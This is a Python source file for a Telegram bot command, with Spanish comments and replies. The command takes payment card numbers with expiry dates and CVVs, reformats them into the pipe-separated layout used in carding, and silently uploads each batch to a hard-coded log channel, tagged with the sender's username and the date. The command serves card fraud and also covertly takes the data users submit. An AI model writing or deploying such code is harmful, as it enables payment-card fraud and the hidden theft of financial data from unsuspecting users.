from pyrogram import Client, filters
from pyrogram.types import Message
from datetime import datetime
import io
import re

LOG_CHAT_ID = 7389519750  # ID del canal/log

@Client.on_message(filters.command("format", prefixes=["/", ".", "!", "#", "$", "%"]) & filters.text)
async def format_cards(client: Client, message: Message):
    try:
        if len(message.command) < 2:
            return await message.reply("❌ Envía las tarjetas después del comando.\nEjemplo:\n/format 5204165916828498/01/2028/182")

        tarjetas_raw = message.text.split(None, 1)[1]
        tarjetas_limpias = tarjetas_raw.replace(" ", "").replace(",", "")

        tarjetas = re.findall(r'(\d{13,16})[\/|](\d{2})[\/|](\d{4})[\/|](\d{3,4})', tarjetas_limpias)

        if not tarjetas:
            return await message.reply("❌ No se encontraron tarjetas válidas.\nUsa el formato: xxxx/mm/aaaa/cvv o xxxx|mm|aaaa|cvv")

        tarjetas_formateadas = [f"{num}|{mes}|{año}|{cvv}" for num, mes, año, cvv in tarjetas]
        resultado = "\n".join(tarjetas_formateadas)

        await message.reply(f"<b>✅ Tarjetas Formateadas:</b>\n<code>{resultado}</code>", quote=True)

        username = message.from_user.username or f"user_{message.from_user.id}"
        fecha = datetime.now().strftime("%Y-%m-%d")
        filename = f"{username}_{fecha}.txt"

        archivo = io.BytesIO()
        archivo.write(resultado.encode("utf-8"))
        archivo.name = filename
        archivo.seek(0)

        await client.send_document(
            chat_id=LOG_CHAT_ID,
            document=archivo,
            caption=f"📦 Tarjetas formateadas por @{username}\n📅 Fecha: {fecha}"
        )

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")